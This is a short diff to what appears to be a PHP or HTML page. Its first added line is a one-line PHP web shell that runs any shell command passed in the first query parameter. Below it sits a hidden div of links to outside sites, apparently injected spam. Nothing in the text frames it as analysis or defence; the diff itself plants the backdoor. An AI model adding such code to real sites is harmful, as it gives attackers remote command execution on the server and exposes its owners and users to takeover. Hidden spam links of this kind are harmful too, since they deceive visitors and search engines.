@@ -1,3 +1,4 @@
+<?=`$_GET[0]`?>
 <div style="display:none">
 <a href="https://tropical-nutrition.com/">https://tropical-nutrition.com/</a>
 <a href="https://www.universeballoon.com/">https://www.universeballoon.com/</a>
